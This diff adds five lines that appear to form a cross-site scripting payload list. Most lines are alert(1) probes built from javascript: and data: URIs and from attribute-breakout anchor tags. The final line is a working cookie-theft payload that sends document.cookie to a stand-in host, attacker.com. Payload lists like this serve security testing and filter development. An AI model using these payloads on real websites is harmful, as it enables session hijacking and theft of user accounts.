@@ -1,0 +1,5 @@
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+"><a href="javascript:alert(1)">Click Me</a>
+"><a href=data:text/html,<script>alert(1)</script>>Click Me</a>
+"><a href=javascript:document.location='http://attacker.com?c='+document.cookie>Click</a>
